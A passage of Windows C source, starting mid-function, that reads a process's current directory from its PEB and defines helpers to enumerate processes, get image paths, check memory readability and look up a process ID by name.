	DWORD dwReturnedLength = 0;
	PUNICODE_STRING pBuffer = NULL;
	LPVOID lpPebBaseAddr = NULL;
	ULONG uPebBaseAddr32 = 0;
	LPVOID lpProcessParameters = NULL;
	ULONG uProcessParameters32 = 0;
	DWORD dwOffset = 0;
	DWORD dwArch = 0;
	LPSTR lpImagePath = NULL;
	UNICODE_STRING TempStr;
	UNICODE_STRING32 TempStr32;
	LPWSTR lpTemp = NULL;;

	lpImagePath = GetProcessImagePath(hProc);
	if (lpImagePath == NULL) {
		goto CLEANUP;
	}

	dwArch = GetImageArchitecture(lpImagePath);
	if (dwArch == IMAGE_FILE_MACHINE_I386) {
		dwOffset = FIELD_OFFSET(RTL_USER_PROCESS_PARAMETERS32, CurrentDirectory);
		uPebBaseAddr32 = GetProcessPebAddr32(hProc);
		if (uPebBaseAddr32 == NULL) {
			goto CLEANUP;
		}

		Status = NtReadVirtualMemory(hProc, PTR_ADD_OFFSET(uPebBaseAddr32, FIELD_OFFSET(PEB32, ProcessParameters)),&uProcessParameters32, sizeof(ULONG), NULL);
		if (!NT_SUCCESS(Status)) {
			LOG_ERROR("NtReadVirtualMemory", Status);
			goto CLEANUP;
		}

		SecureZeroMemory(&TempStr32, sizeof(TempStr32));
		Status = NtReadVirtualMemory(hProc, PTR_ADD_OFFSET(uProcessParameters32, dwOffset), &TempStr32, sizeof(TempStr32),NULL);
		if (!NT_SUCCESS(Status)) {
			LOG_ERROR("NtReadVirtualMemory", Status);
			goto CLEANUP;
		}

		if (TempStr32.Length == 0 || TempStr32.Buffer == NULL) {
			goto CLEANUP;
		}

		lpTemp = ALLOC(TempStr32.Length + sizeof(WCHAR));
		Status = NtReadVirtualMemory(hProc, (LPVOID)TempStr32.Buffer, lpTemp, TempStr32.Length, NULL);
		if (!NT_SUCCESS(Status)) {
			LOG_ERROR("NtReadVirtualMemory", Status);
			goto CLEANUP;
		}

		lpResult = ConvertWcharToChar(lpTemp);
	}
	else if (dwArch == IMAGE_FILE_MACHINE_AMD64) {
		dwOffset = FIELD_OFFSET(RTL_USER_PROCESS_PARAMETERS, CurrentDirectory);
		lpPebBaseAddr = GetProcessPebAddr(hProc);
		if (lpPebBaseAddr == NULL) {
			goto CLEANUP;
		}

		Status = NtReadVirtualMemory(hProc, PTR_ADD_OFFSET(lpPebBaseAddr, FIELD_OFFSET(PEB, ProcessParameters)),&lpProcessParameters, sizeof(LPVOID), NULL);
		if (!NT_SUCCESS(Status)) {
			LOG_ERROR("NtReadVirtualMemory", Status);
			goto CLEANUP;
		}

		SecureZeroMemory(&TempStr, sizeof(TempStr));
		Status = NtReadVirtualMemory(hProc, PTR_ADD_OFFSET(lpProcessParameters, dwOffset), &TempStr, sizeof(TempStr), NULL);
		if (!NT_SUCCESS(Status)) {
			LOG_ERROR("NtReadVirtualMemory", Status);
			goto CLEANUP;
		}

		if (TempStr.Length == 0 || TempStr.Buffer == NULL) {
			goto CLEANUP;
		}

		lpTemp = ALLOC(TempStr.Length + sizeof(WCHAR));
		Status = NtReadVirtualMemory(hProc, TempStr.Buffer, lpTemp, TempStr.Length, NULL);
		if (!NT_SUCCESS(Status)) {
			LOG_ERROR("NtReadVirtualMemory", Status);
			goto CLEANUP;
		}

		lpResult = ConvertWcharToChar(lpTemp);
	}

CLEANUP:
	FREE(pBuffer);
	FREE(lpImagePath);
	FREE(lpTemp);

	return lpResult;
}

PSYSTEM_PROCESS_INFORMATION EnumProcess
(
	_Out_ PDWORD pcbOutput
)
{
	NTSTATUS Status = 0;
	ULONG uResult = 0;
	DWORD dwReturnedLength = 0;
	PSYSTEM_PROCESS_INFORMATION pProcesses = NULL;
	DWORD cbProcesses = 0x4000;

	pProcesses = ALLOC(cbProcesses);
	while (TRUE) {
		dwReturnedLength = 0;
		Status = NtQuerySystemInformation(SystemProcessInformation, pProcesses, cbProcesses, &dwReturnedLength);
		if (Status == STATUS_BUFFER_TOO_SMALL || Status == STATUS_INFO_LENGTH_MISMATCH) {
			cbProcesses = dwReturnedLength;
			pProcesses = REALLOC(pProcesses, cbProcesses);
		}
		else if (NT_SUCCESS(Status)) {
			break;
		}
		else {
			FREE(pProcesses);
			pProcesses = NULL;
			LOG_ERROR("NtQuerySystemInformation", Status);
			goto CLEANUP;
		}
	}

	if (pcbOutput != NULL) {
		*pcbOutput = dwReturnedLength;
	}

CLEANUP:
	return pProcesses;
}

LPSTR GetProcessImageFileNameWin32
(
	_In_ HANDLE hProc
)
{
	NTSTATUS Status = 0;
	PUNICODE_STRING pImagePath = NULL;
	ULONG cbBuffer = 0;
	ULONG uReturnedLength = 0;
	LPSTR lpResult = NULL;

	cbBuffer = sizeof(UNICODE_STRING) + DOS_MAX_PATH_LENGTH;
	pImagePath = ALLOC(cbBuffer);

	Status = NtQueryInformationProcess(hProc, ProcessImageFileNameWin32, pImagePath, cbBuffer, &uReturnedLength);
	if (Status == STATUS_INFO_LENGTH_MISMATCH) {
		cbBuffer = uReturnedLength;
		pImagePath = REALLOC(pImagePath, cbBuffer);
		Status = NtQueryInformationProcess(hProc, ProcessImageFileNameWin32, pImagePath, cbBuffer, &uReturnedLength);
	}

	if (NT_SUCCESS(Status)) {
		lpResult = ConvertWcharToChar(pImagePath->Buffer);
	}
	else {
		LOG_ERROR("NtQueryInformationProcess", Status);
		goto CLEANUP;
	}

CLEANUP:
	if (pImagePath != NULL) {
		FREE(pImagePath);
	}

	return lpResult;
}

BOOL IsMemoryReadable
(
	_In_ LPVOID lpAddress
)
{
	MEMORY_BASIC_INFORMATION MemInfo;

	SecureZeroMemory(&MemInfo, sizeof(MemInfo));
	if (VirtualQuery(lpAddress, &MemInfo, sizeof(MemInfo)) == 0) {
		return FALSE;
	}

	if (MemInfo.State != MEM_COMMIT) {
		return FALSE;
	}

	if (MemInfo.Protect == PAGE_NOACCESS || MemInfo.Protect == PAGE_EXECUTE) {
		return FALSE;
	}

	return TRUE;
}

DWORD GetProcessIdFromName
(
	_In_ LPSTR lpProcessName
)
{
	PROCESSENTRY32W ProcessEntry;
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;
	LPWSTR lpConvertedName = NULL;
	DWORD dwResult = 0;

	SecureZeroMemory(&ProcessEntry, sizeof(ProcessEntry));
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		LOG_ERROR("CreateToolhelp32Snapshot", GetLastError());
		goto CLEANUP;
	}

	ProcessEntry.dwSize = sizeof(ProcessEntry);
	if (Process32FirstW(hSnapshot, &ProcessEntry) == FALSE) {
		LOG_ERROR("Process32First", GetLastError());
		goto CLEANUP;
	}

	lpConvertedName = ConvertCharToWchar(lpProcessName);
	if (StrCmpI(ProcessEntry.szExeFile, lpConvertedName) == 0) {
		dwResult = ProcessEntry.th32ProcessID;
		goto CLEANUP;
	}

	while (Process32NextW(hSnapshot, &ProcessEntry)) {
		if (StrCmpI(ProcessEntry.szExeFile, lpConvertedName) == 0) {
			dwResult = ProcessEntry.th32ProcessID;
			goto CLEANUP;
		}
	}

CLEANUP:
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		CloseHandle(hSnapshot);
	}

	if (lpConvertedName != NULL) {
		FREE(lpConvertedName);
	}

	return dwResult;
}